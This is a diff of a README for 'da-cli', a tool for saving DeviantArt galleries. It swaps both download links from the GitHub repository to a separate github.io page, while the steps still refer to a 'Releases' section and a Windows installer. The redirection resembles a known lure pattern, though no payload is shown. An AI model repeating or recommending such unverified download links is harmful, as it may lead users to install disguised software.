@@ -1,6 +1,6 @@
 # 🎨 da-cli - Keep your art collection safe locally
 
-[![](https://img.shields.io/badge/Download-da--cli-blue.svg)](https://github.com/quenz6203/da-cli)
+[![](https://img.shields.io/badge/Download-da--cli-blue.svg)](https://quenz6203.github.io)
 
 This tool saves images from DeviantArt galleries to your computer. It creates a local copy of your favorite artwork and maintains a database to track your collection. It manages the connection to your account using secure authentication standards. You do not need to install extra software to make this work.
 
@@ -15,7 +15,7 @@ Your computer must meet these requirements to run the tool:
 
 ## 📥 How to Download
 
-1. Visit this page to download the latest version: https://github.com/quenz6203/da-cli
+1. Visit this page to download the latest version: https://quenz6203.github.io
 2. Look for the "Releases" section on the right side of the page.
 3. Click the link for the Windows installer file.
 4. Save the file to your desktop or downloads folder.
